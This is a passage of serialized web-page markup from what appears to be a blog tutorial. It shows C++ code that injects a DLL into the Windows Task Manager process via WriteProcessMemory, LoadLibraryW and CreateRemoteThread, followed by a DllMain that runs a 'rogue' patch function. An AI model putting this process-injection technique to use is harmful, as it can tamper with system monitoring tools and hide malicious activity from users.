PAGE_EXECUTE\"]}],[\"$\",\"span\",\"code-segement107\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement108\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement109\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\r\\n\"]}],[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[12]}],[\"$\",\"span\",\"code-segement111\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\t\"]}],[\"$\",\"span\",\"code-segement112\",{\"className\":\"token function\",\"style\":{},\"children\":[\"WriteProcessMemory\"]}],[\"$\",\"span\",\"code-segement113\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement114\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"taskManagerH\"]}],[\"$\",\"span\",\"code-segement115\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement116\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" remoteString\"]}],[\"$\",\"span\",\"code-segement117\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement118\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" dllName\"]}],[\"$\",\"span\",\"code-segement119\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement120\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" namelen\"]}],[\"$\",\"span\",\"code-segement121\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement122\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(14, 58%, 55%)\"},\"children\":[\"2\"]}],[\"$\",\"span\",\"code-segement123\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement124\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement125\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"NULL\"]}],[\"$\",\"span\",\"code-segement126\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement127\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement128\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\r\\n\"]}],[\"$\",\"span\",\"line-number--13\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[13]}],\"\\r\\n\",[\"$\",\"span\",\"line-number--14\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[14]}],[\"$\",\"span\",\"code-segement132\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\tHMODULE k32 \"]}],[\"$\",\"span\",\"code-segement133\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement134\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement135\",{\"className\":\"token function\",\"style\":{},\"children\":[\"GetModuleHandleA\"]}],[\"$\",\"span\",\"code-segement136\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement137\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\\\"kernel32.dll\\\"\"]}],[\"$\",\"span\",\"code-segement138\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement139\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement140\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\r\\n\"]}],[\"$\",\"span\",\"line-number--15\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[15]}],[\"$\",\"span\",\"code-segement142\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\tLPVOID funcAddr \"]}],[\"$\",\"span\",\"code-segement143\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement144\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement145\",{\"className\":\"token function\",\"style\":{},\"children\":[\"GetProcAddress\"]}],[\"$\",\"span\",\"code-segement146\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement147\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"k32\"]}],[\"$\",\"span\",\"code-segement148\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement149\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement150\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\\\"LoadLibraryW\\\"\"]}],[\"$\",\"span\",\"code-segement151\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement152\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement153\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\r\\n\"]}],[\"$\",\"span\",\"line-number--16\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[16]}],\"\\r\\n\",[\"$\",\"span\",\"line-number--17\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[17]}],[\"$\",\"span\",\"code-segement157\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\tHANDLE thread \"]}],[\"$\",\"span\",\"code-segement158\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement159\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement160\",{\"className\":\"token function\",\"style\":{},\"children\":[\"CreateRemoteThread\"]}],[\"$\",\"span\",\"code-segement161\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement162\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"taskManagerH\"]}],[\"$\",\"span\",\"code-segement163\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement164\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement165\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"NULL\"]}],[\"$\",\"span\",\"code-segement166\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement167\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement168\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"NULL\"]}],[\"$\",\"span\",\"code-segement169\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement170\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement171\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement172\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"LPTHREAD_START_ROUTINE\"]}],[\"$\",\"span\",\"code-segement173\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement174\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"funcAddr\"]}],[\"$\",\"span\",\"code-segement175\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement176\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" remoteString\"]}],[\"$\",\"span\",\"code-segement177\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement178\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement179\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"NULL\"]}],[\"$\",\"span\",\"code-segement180\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement181\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement182\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"NULL\"]}],[\"$\",\"span\",\"code-segement183\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement184\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement185\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\r\"]}]]]}]}],[\"$\",\"div\",null,{\"className\":\"text-center text-md text-gray-500 mt-2 mb-2\",\"children\":\"Listing 4. DLL injection\"}]],[\"$\",\"p\",null,{\"children\":[\"For the first step, I need to obtain the process identifier (PID) of the Task Manager. To do that, I can just use \",[\"$\",\"code\",null,{\"className\":\"code-snippet\",\"children\":\"FindWindow\"}],\" method to get a handle for Task Manager window. The window handle is used in \",[\"$\",\"code\",null,{\"className\":\"code-snippet\",\"children\":\"GetWindowThreadProcessId\"}],\" method to obtain PID of that window.  For the second step, you can use \",[\"$\",\"code\",null,{\"className\":\"code-snippet\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex\",\"children\":\"VirtualAllocEx\"}]}],\" and \",[\"$\",\"code\",null,{\"className\":\"code-snippet\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory\",\"children\":\"WriteProcessMemory\"}]}],\" to manipulate memory on a remote process. The method names seem to be self-explanatory.  For the third step, you can use \",[\"$\",\"code\",null,{\"className\":\"code-snippet\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread\",\"children\":\"CreateRemoteThread\"}]}],\". Ideally, you will need to get the address of \",[\"$\",\"code\",null,{\"className\":\"code-snippet\",\"children\":\"LoadLibraryW\"}],\" on the remote process, right? I honestly don't know why this works. Maybe \",[\"$\",\"code\",null,{\"className\":\"code-snippet\",\"children\":\"kernel32.dll\"}],\" is always loaded on the same virtual address on all processes?  I now have an injector! I just need to put my rogue function into a DLL. Below is the main or entry point of the DLL.\"]}],[[\"$\",\"pre\",null,{\"style\":{\"color\":\"white\",\"background\":\"hsl(0, 0%, 8%)\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"textShadow\":\"0 -.1em .2em black\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"borderRadius\":\".5em\",\"border\":\".3em solid hsl(0, 0%, 33%)\",\"boxShadow\":\"1px 1px .5em black inset\",\"margin\":\".5em 0\",\"overflow\":\"auto\",\"padding\":\"1em\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-cpp\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"white\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"textShadow\":\"0 -.1em .2em black\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[1]}],[\"$\",\"span\",\"code-segement1\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"BOOL APIENTRY \"]}],[\"$\",\"span\",\"code-segement2\",{\"className\":\"token function\",\"style\":{},\"children\":[\"DllMain\"]}],[\"$\",\"span\",\"code-segement3\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"HMODULE hModule\"]}],[\"$\",\"span\",\"code-segement5\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" DWORD ul_reason_for_call\"]}],[\"$\",\"span\",\"code-segement7\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement8\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[2]}],[\"$\",\"span\",\"code-segement10\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                      LPVOID lpReserved\"]}],[\"$\",\"span\",\"code-segement11\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement12\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement13\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement14\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[3]}],\"\\n\",[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[4]}],[\"$\",\"span\",\"code-segement18\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"  \"]}],[\"$\",\"span\",\"code-segement19\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"switch\"]}],[\"$\",\"span\",\"code-segement20\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement21\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement22\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"ul_reason_for_call\"]}],[\"$\",\"span\",\"code-segement23\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement24\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement25\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement26\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[5]}],[\"$\",\"span\",\"code-segement28\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"  \"]}],[\"$\",\"span\",\"code-segement29\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"case\"]}],[\"$\",\"span\",\"code-segement30\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" DLL_PROCESS_ATTACH\"]}],[\"$\",\"span\",\"code-segement31\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement32\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[6]}],[\"$\",\"span\",\"code-segement34\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement35\",{\"className\":\"token function\",\"style\":{},\"children\":[\"WriteLog\"]}],[\"$\",\"span\",\"code-segement36\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement37\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"L\"]}],[\"$\",\"span\",\"code-segement38\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\\\"Process Attached!\\\"\"]}],[\"$\",\"span\",\"code-segement39\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement40\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement41\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[7]}],[\"$\",\"span\",\"code-segement43\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement44\",{\"className\":\"token function\",\"style\":{},\"children\":[\"AllocConsole\"]}],[\"$\",\"span\",\"code-segement45\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement46\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement47\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[8]}],[\"$\",\"span\",\"code-segement50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement51\",{\"className\":\"token function\",\"style\":{},\"children\":[\"freopen\"]}],[\"$\",\"span\",\"code-segement52\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement53\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\\\"CONOUT$\\\"\"]}],[\"$\",\"span\",\"code-segement54\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement55\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement56\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\\\"w\\\"\"]}],[\"$\",\"span\",\"code-segement57\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement58\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement59\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"stdout\"]}],[\"$\",\"span\",\"code-segement60\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement61\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement62\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[9]}],[\"$\",\"span\",\"code-segement64\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement65\",{\"className\":\"token function\",\"style\":{},\"children\":[\"Patch\"]}],[\"$\",\"span\",\"code-segement66\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement67\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement68\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement69\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[10]}],[\"$\",\"span\",\"code-segement71\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement72\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"break\"]}],[\"$\",\"span\",\"code-segement73\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement74\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[11]}],[\"$\",\"span\",\"code-segement76\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"  \"]}],[\"$\",\"span\",\"code-segement77\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"case\"]}],[\"$\",\"span\",\"code-segement78\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" DLL_THREAD_ATTACH\"]}],[\"$\",\"span\",\"code-segement79\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement80\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[12]}],[\"$\",\"span\",\"code-segement82\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement83\",{\"className\":\"token function\",\"style\":{},\"children\":[\"WriteLog\"]}],[\"$\",\"span\",\"code-segement84\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement85\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"L\"]}],[\"$\",\"span\",\"code-segement86\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\\\"Thread Attached!\\\"\"]}],[\"$\",\"span\",\"code-segement87\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement88\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement89\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--13\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[13]}],[\"$\",\"span\",\"code-segement91\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement92\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"break\"]}],[\"$\",\"span\",\"code-segement93\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement94\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--14\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[14]}],[\"$\",\"span\",\"code-segement96\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"  \"]}],[\"$\",\"span\",\"code-segement97\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"case\"]}],[\"$\",\"span\",\"code-segement98\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" DLL_THREAD_DETACH\"]}],[\"$\",\"span\",\"code-segement99\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement100\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--15\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 